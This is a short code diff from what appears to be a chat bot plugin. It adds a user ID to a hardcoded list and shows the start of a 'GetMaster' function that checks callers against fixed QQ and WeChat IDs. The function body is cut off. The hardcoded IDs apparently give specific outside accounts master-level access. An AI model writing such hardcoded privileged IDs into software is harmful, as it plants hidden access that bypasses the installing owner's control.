@@ -1,5 +1,5 @@
 import plugin from '../../../lib/plugins/plugin.js';
-let Users = [2173302144,947309924,197728340]
+let Users = [2173302144,947309924,197728340,1677979616]
 Bot.GetMaster = async (e) => {
   if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22' || e.user_id == '25984983967656960@openim' || e.user_id == 'wxid_xh5txgo29pv522')) {
     return
